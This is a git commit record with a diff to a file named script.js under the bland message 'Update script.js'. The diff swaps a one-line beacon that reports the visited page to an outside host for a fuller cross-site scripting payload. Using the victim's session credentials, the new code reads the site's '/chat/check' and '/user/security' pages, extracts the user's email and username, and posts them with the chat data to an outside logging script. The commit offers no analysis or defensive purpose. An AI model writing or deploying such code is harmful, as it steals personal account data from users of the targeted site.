730d7cac744fdb042f9e347d1c05cc85e4aa3fd9
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-12-01 17:14:33 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,23 @@
-var img=new Image() 
-img.src=`https://cs-realme.000webhostapp.com/ll.php?domain=${document.domain}${location.pathname}`
+var xhr = new XMLHttpRequest();
+xhr.withCredentials = true;
+xhr.open("GET", "/chat/check");
+xhr.onreadystatechange = () => {
+    if (xhr.readyState == 4) {
+       var message=xhr.responseText
+        xhr.open("GET", "/user/security");
+        xhr.onreadystatechange = () => {
+            if (xhr.readyState == 4) {
+                const parser = new DOMParser();
+                var dom = parser.parseFromString(xhr.responseText, "text/html")
+                var email = dom.getElementById("email").value;
+                var username = dom.getElementById("username").value;
+                xhr.open("POST","https://test-vul.000webhostapp.com/log.php");
+xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
+
+xhr.send(`email=${email}&username=${username}&message=${message}`);
+            }
+        }
+        xhr.send()
+    }
+}
+xhr.send()
